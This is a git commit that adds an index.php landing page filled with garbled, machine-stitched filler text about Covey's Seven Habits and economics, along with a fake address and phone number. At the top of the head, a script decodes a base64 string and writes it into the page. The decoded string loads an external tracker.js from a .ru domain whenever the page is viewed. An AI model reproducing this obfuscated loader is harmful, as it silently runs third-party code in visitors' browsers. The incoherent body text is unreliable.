139e07a9b7834a4721117ebb527d909d478cf66a
sldpgttl <81527270+sldpgttl@users.noreply.github.com>
2021-03-28 20:11:45 +0300

    Add files via upload

---
+++ index.php
@@ -0,0 +1,146 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl90cTdobTh6Z3JkdHN3MG01OHkiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>We explored a new land - unknown and frightening, causi</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+</head>
+
+<body>
+
+	<header class="cpckclpvz034f13rpjmhpsb">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="flow.html">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="6t7algjd7vu5l9x">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>We explored a new land - unknown and frightening, causi</h1>
+	</section>
+
+
+	<section class="our-work" class="2jf2gjdyh5mrrkq20v0g0xk">
+		<h3 class="title">"What we stand on depends on where we sit." Each of</h3>
+		<p>Especially if the other person does not share this paradigm.  Most people are programmed with what I call the Scarcity Mentality.Such people see life as the process of eating one pie for all.  After all, the harder you work, the longer you live.  He shared with his daughter, told her about his worries and worries, and it was he who instilled in Sandra a deep respect for the Frigidare company, which supported him in difficult times.  Then they decided to send the patient home.  The foundation of trust is lacking, and the Win / Win approach becomes an ineffective superficial technique.  This procedure for accounting for proceeds allows for timely settlements with the budget and extra-budgetary funds,since there is a real source of money for the accrued taxes and payments.  This is an "inside-out" process.  It offers notes and to-do lists from where we can cross out what we have done, each time experiencing a temporary sense of satisfaction. </p>
+		<hr>
+
+		<ul class="grid" class="qffw0ite5swgbidinx6hmtz3">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+<table class="brd" class="2jf2gjdyh5mrrkq20v0g0xk">
+  <tr>
+    <th>n/n</th>
+    <th>A</th>
+    <th>B</th>
+    <th>C</th>
+  </tr>
+  <tr>
+    <td>1</td>
+    <td>Important and not urgent matters require from us more initiative, more proactiveness.  But she, comprehended and assimilated by all the</td>
+    <td>Everyone knew that the situation had to get worse before it could begin to improve.  You can also be a very busy person witho</td>
+    <td>They are conventionally divided into price and non-price.  A planned economy differs from a market economy, and therefore accounting in our co</td>
+  </tr>
+  <tr>
+    <td>2</td>
+    <td>At the end of the negotiations, representatives of the corporation said: “We want to work with you! We are ready to sign this contract.  The principles</td>
+    <td>To make decisions, government officials must have a large amount of information regarding the needs for inventories, stocks of raw materials, and pr</td>
+    <td>Thus, in the long term, in the context of interdependence, the Win / Lose attitude turns into a Lose / Lose attitude.  We told them t</td>
+  </tr>
+  <tr>
+    <td>3</td>
+    <td>I went through the agony of giving up old habitsbecause I stopped dealing with many of those urgent, pressing problems th</td>
+    <td>Then, even at the time of the most difficult trials, I will be able to make the right decision based on these values.  It is establi</td>
+    <td>when making decisions, the interests of the nation as a whole are taken into account.  84.  Peer society is another powerful programming factor.  It suits both the</td>
+  </tr>
+</table>
+
+
+	<section class="our-work" class="cpckclpvz034f13rpjmhpsb">
+		<h3 class="title">And if they are not involved, they simply </h3>
+		<p>Maintaining the P / PC balance is of particular importance in relation to the human resources of the organization - customers and employees.  Many small businesses would prefer to pay VAT so that buyers who are legal entities can accept these amounts for deduction.  At the very end of the third day, we summed up the results of our conference, answering the question:"How are we doing?" The answer consisted of three parts: Part one.  The capital market is sometimes subdivided into a securities market and a capital market.  And we all know how cruel our peers can be.  They tried to "jump" into effective relationships before they matured, without gaining the strength of character to support them.  Conversely, even small manifestations of impoliteness, ill will and disrespect can turn into a significant withdrawal from the Account. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="6t7algjd7vu5l9x" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="2jf2gjdyh5mrrkq20v0g0xk">
+		<h3 class="title">Freedom of choice contains within itself those unique qualities</h3>
+		<p>The main condition for such an organization of production is the specialization of production and management.Moreover, as the size of production grows, the opportunities for using the advantages of specialization in production and management increase.  Visualize the desired result.  And, having satisfied this vital need for him, you can then focus on influencing this person or on solving the problem that has arisen.  Take a few minutes and write down your roles as they appear to you now.  Wages Wages are the price paid for the use of labor.  buyers can be divided into groups, the demand of each of which will differ in the degree of elasticity; 3) a consumer who buys a product at a lower price cannot sell it at a higher price.Price discrimination has three forms: 1) according to the buyer's income.  Optimization of the volume of production in conditions of maximizing profits A), minimizing losses B), and stopping production C).  If in the intellectual, I can think independently, I am subject to different levels of abstract thinking. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="qffw0ite5swgbidinx6hmtz3" style="background-image: url(image3.jpg);"></li>
+			<li class="large" class="qffw0ite5swgbidinx6hmtz3" style="background-image: url(image8.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="cpckclpvz034f13rpjmhpsb">
+		<h3 class="title">The source of all four life-supporting factors is t</h3>
+		<p>Initially, the weight content of the monetary unit coincided with the scale of prices, which was reflected in the names of some monetary units.  In The Seven Habits of Highly Effective People, he offers us an opportunity, not an instruction, to answer the question "How?" This opportunity lies in using the wise teachings of Covey to better know ourselves and our influence on other people.  You know that the only way to cope with Quadrant I is to devote enough attention to Quadrant II, doing crisis prevention and looking for opportunities and saying a courageous “no” to the activities of Quadrants III and IV.  Cost targets are the expected future profits.Revenue of the enterprise Each enterprise, before starting to manufacture products, determines what profit, what income it can receive.  This test made us completely open and very vulnerable and unprotected to each other. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="6t7algjd7vu5l9x" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="2jf2gjdyh5mrrkq20v0g0xk">
+		<h3 class="title">Paper money that is in circulation can be </h3>
+		<p>The underlying idea behind marketing is the idea of ​​human needs.  They were unable to measure or measure their performance, and as a result, they lost productivity and ceased to be listed in the market.  As long as we are able to distinguish an arbitrarily small space separating us and Truth, we remain outside the Truth.  Wages Wages are the price paid for the use of labor.  The paradox of value.  THE LAW OF DEMAND Demand is a form of expression of need.  You can do whatever you want, just don't paint with paint.  If they have a problem with someone - a son, a daughter, a husband or a subordinate - the reaction is: "He (she) just does not want to understand me!" Once one dad complained to me: - I don't understand my son.  When applied to an organization, the physical dimension is expressed in economic terms. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="qffw0ite5swgbidinx6hmtz3" class="title">To start with an ultimate goal means to start with a clear awar</h3>	
+		<p>As we study these skills, we will see how they interact with each other to create effective interdependence.  It is the risks that determine the appropriation of net profit by the entrepreneur, since otherwise all the losses fall on him.  Secondly, both sides from the very beginning acted on the basis of good intentions, and did not want to resort to legal proceedings at all, but did not see any other way out.  Production costs are the total cost of labor to produce a product.  Time Factor and Supply Elasticity The figure shows how producers adjust to changing demand in different time periods and how the supply elasticity changes over time.  When, after five and a half months, the administration finally discovered the error, it was decided to retest the students without telling anyone what had happened.  - Then present your point of view effectively! You must come into close contact with him.You must understand his way of thinking.  I introduced the concept of autobiographical answers to thousands of people across the country, and each time they were deeply shocked when, during the training for empathic listening, they suddenly began to realize how they usually react when communicating with other people.  And then, seeing how his face tightened from the effort, how his blood vessels swelled, I thought: “Now the barbell will break out of his hands and break his chest.  I am convinced that this rope can be broken.  Square II is centered on a principle-based paradigm.  Prairie dogs abstained from school and demanded a refund of taxes paid by them, since the school administration did not include burrows and underground tunnels in the program.  Once you understand the depth and vitality of Stephen Covey's findings, you can try to put the Seven Habits into practice - and you can get amazing results.You will learn how to effectively interact with other people: with a boss, with subordinates, with a colleague, with a husband or wife, with children and friends. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="cpckclpvz034f13rpjmhpsb">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="6t7algjd7vu5l9x"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="2jf2gjdyh5mrrkq20v0g0xk"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="qffw0ite5swgbidinx6hmtz3"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>99172 Clay Garden, Suite 382, 86110-9737, Schummside, North Dakota, United States</p>
+		<p>Phone number: +39(27)518-87-10602</p>
+	</footer>
+
+</body>
+
+</html>
